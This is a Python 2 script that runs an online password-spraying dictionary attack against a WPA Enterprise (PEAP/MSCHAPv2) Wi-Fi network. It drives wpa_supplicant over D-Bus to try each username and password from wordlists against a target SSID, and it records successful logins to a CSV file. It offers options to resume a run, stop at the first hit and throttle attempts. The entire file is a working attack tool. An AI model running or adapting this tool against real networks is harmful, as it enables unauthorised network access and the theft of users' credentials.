#!/usr/bin/env python

import argparse
import datetime
import time
import sys

from wpa_supplicant.core import WpaSupplicantDriver
from twisted.internet.selectreactor import SelectReactor
import threading


def timestamp():
    Y = datetime.datetime.now().year
    M = datetime.datetime.now().month
    D = datetime.datetime.now().day
    h = datetime.datetime.now().hour
    m = datetime.datetime.now().minute
    s = datetime.datetime.now().second

    timestamp = "%02d-%02d-%02d %02d:%02d:%02d" % (Y, M, D, h, m, s)
    return timestamp


def connect_to_wifi(ssid, password, username,
                    interface, supplicant, outfile=None,
                    authentication="wpa-enterprise"):
    valid_credentials_found = False

    print "Trying %s:%s..." % (username, password)

    # WPA Enterprise configuration
    if authentication == "wpa-enterprise":
        network_params = {
            "ssid": ssid,
            "key_mgmt": "WPA-EAP",
            "eap": "PEAP",
            'identity': username,
            'password': password,
            "phase2": "auth=MSCHAPV2",
        } 

    # Remove all the networks currently assigned to this interface
    for network in interface.get_networks():
        network_path = network.get_path()
        interface.remove_network(network_path)

    # Add target network to the interface and connect to it 
    interface.add_network(network_params)
    target_network = interface.get_networks()[0].get_path()

    interface.select_network(target_network)

    # Check the status of the wireless connection
    credentials_valid = 0
    max_wait = 4.5
    # How often, in seconds, the loop checks for successful authentication
    test_interval = 0.01
    seconds_passed = 0
    while seconds_passed <= max_wait:
        try:
            state = interface.get_state()
            if state == "completed":
                credentials_valid = 1
                break
        except Exception, e:
            print e
            break

        time.sleep(test_interval)   
        seconds_passed += test_interval

    if credentials_valid == 1:
        print "[!] VALID CREDENTIALS: %s:%s" % (username, password)
        if outfile:              
            f = open(outfile, 'a')

            csv_output = "\"%(timestamp)s\",\"%(ssid)s\",\"%(username)s\",\"%(password)s\"\n" % \
                         {"timestamp": timestamp(), 
                          "ssid": ssid,
                          "username": username,
                          "password": password,
                         }

            f.write(csv_output)
            f.close()
        valid_credentials_found = True

    # Disconnect from the network
    try: interface.disconnect_network()
    except: pass

    try: interface.remove_network(target_network)
    except: pass

    return valid_credentials_found



# Handle command-line arguments and generate usage text.
description = "Perform an online, horizontal dictionary attack against a WPA Enterprise network."

parser = argparse.ArgumentParser(
                description=description, add_help=False,
                formatter_class=argparse.ArgumentDefaultsHelpFormatter
                )
parser.add_argument('-i', type=str, required=True, metavar='interface', 
                    dest='device', help='Wireless interface')
parser.add_argument('-e', type=str, required=True,
                    dest='ssid', help='SSID of the target network')
parser.add_argument('-u', type=str, required=True, dest='userfile', 
                    help='Username wordlist')
parser.add_argument('-P', dest='password', default=None,
                    help='Password to try on each username')
parser.add_argument('-p', dest='passfile', default=None,
                    help='List of passwords to try for each username')
parser.add_argument('-s', type=int, default=0, dest='start', metavar='line',
                    help='Optional start line to resume attack. May not be used with a password list.')
parser.add_argument('-w', type=str, default=None, dest='outfile', 
                    help='Save valid credentials to a CSV file')
parser.add_argument('-1', default=False, dest='stop_on_success', 
                    action='store_true',
                    help='Stop after the first set of valid credentials are found')
parser.add_argument('-t', default=0.5, metavar='seconds', type=float,
                    dest='attempt_delay',
                    help='Seconds to sleep between each connection attempt')
# Workaround to make help display without adding "-h" to the usage line
if "-h" in sys.argv or "--help" in sys.argv or len(sys.argv) == 1:
    parser.print_help()
    exit()
args = parser.parse_args()



if (args.password == None) and (args.passfile == None):
    print "You must specify a password or password list."
    exit()

if (args.start != 0) and (args.passfile != None):
    print "The start line option may not be used with a password list."
    exit()

device          = args.device
ssid            = args.ssid
userfile        = args.userfile
password        = args.password
passfile        = args.passfile
start           = args.start
outfile         = args.outfile
stop_on_success = args.stop_on_success
attempt_delay   = args.attempt_delay

if passfile != None:
    f = open(passfile, 'r')
    content = f.read()
    f.close()
    content.replace("\r","")
    passwords = content.split("\n")
    # If there is a trailing line at the end of the file, remove it from
    # the password list
    if passwords[-1] == "":
        passwords = passwords[0:-1]
else:
    passwords = [password]

# Start a simple Twisted SelectReactor
reactor = SelectReactor()
threading.Thread(target=reactor.run, kwargs={'installSignalHandlers': 0}).start()
time.sleep(0.1)  # let reactor start

# Start Driver
driver = WpaSupplicantDriver(reactor)

# Connect to the supplicant, which returns the "root" D-Bus object for wpa_supplicant
supplicant = driver.connect()

# Register an interface w/ the supplicant, this can raise an error if the supplicant
# already knows about this interface
try:
    interface = supplicant.get_interface(device)
except:
    interface = supplicant.create_interface(device)


# Read usernames into array, users
f = open(userfile, 'r')
users = [l.rstrip() for l in f.readlines()]
f.close()

try:
    for password in passwords:
        for n in range(start, len(users)):
            print "[%s] " % n,
            valid_credentials_found = connect_to_wifi(ssid=ssid, 
                                                      username=str(users[n]), 
                                                      password=str(password), 
                                                      interface=interface,
                                                      supplicant=supplicant, 
                                                      outfile=outfile)
            if (valid_credentials_found and stop_on_success):
                break

            time.sleep(attempt_delay)

        if (valid_credentials_found and stop_on_success):
                break
    
    if reactor.running == True:
            reactor.sigBreak()

    print "DONE!"
except KeyboardInterrupt:
    # Stop the running reactor so the program can exit
    if reactor.running == True:
        reactor.sigBreak()
    print "Attack stopped by user."
except Exception, e:
    print e
    if reactor.running == True:
        reactor.sigBreak()


